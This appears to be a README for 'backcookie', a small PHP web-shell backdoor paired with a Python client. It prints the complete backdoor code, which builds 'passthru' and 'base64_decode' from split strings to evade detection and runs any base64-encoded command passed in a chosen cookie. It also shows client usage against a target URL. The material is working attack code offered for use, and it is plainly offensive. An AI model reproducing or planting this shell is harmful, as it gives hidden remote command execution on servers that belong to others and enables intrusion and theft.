backcookie
==========


Small backdoor using cookie.

==========

```php
<?php
# the code of the backdoor used
$bOne = "pa"."ss"."th"."ru";
$bTwo = "ba"."se"."64"."_"."de"."co"."de";
$bKey = "yourcookie"; # conection backdoor
$bOne($bTwo($_COOKIE[$bKey]));
?>
```

```
Example one: python backcookie.py -u http://target.com/shell.php -c name_cookie
```
```
Example two: python backcookie.py --url http://target.com/shell.php --cookie name_cookie
```
Custom command (binfo), You get objective information
```
@pwned:~$ binfo
```

Custom command (exit), to exit.
```
@pwned:~$ exit
```

* Inserted in -> [blackarch](http://blackarch.org/tools.html)

## Happy hacking!

-------------

Copyright, 2013 - 2016 by [Jose Pino](http://twitter.com/jofpin)

-------------
